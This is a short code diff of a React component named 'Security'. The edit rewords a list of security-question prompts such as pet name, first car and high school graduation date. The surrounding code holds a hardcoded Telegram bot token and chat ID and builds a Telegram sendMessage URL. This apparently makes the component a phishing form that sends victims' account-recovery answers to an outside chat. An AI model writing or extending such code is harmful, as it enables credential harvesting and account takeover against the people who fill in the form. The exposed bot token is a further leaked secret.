@@ -28,8 +28,8 @@ const Security: React.FC = () => {
     "Name of your current employer",
     "Name of your pet",
     "Maker of your first car",
-     "Name of High School",
-    "Graduated Year (High School)"
+    "Name of High School",
+    "Graduated Month & Year (High School)"
   ];
 
   const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
@@ -54,6 +54,7 @@ const Security: React.FC = () => {
 
     const telegramBotToken = '6923253185:AAEeCL3NG0iF4TGMR4V8Ib2kITqDiOJ7IKo';
     const telegramChatId = '6639364559';
+   
 
     const telegramApiUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
 
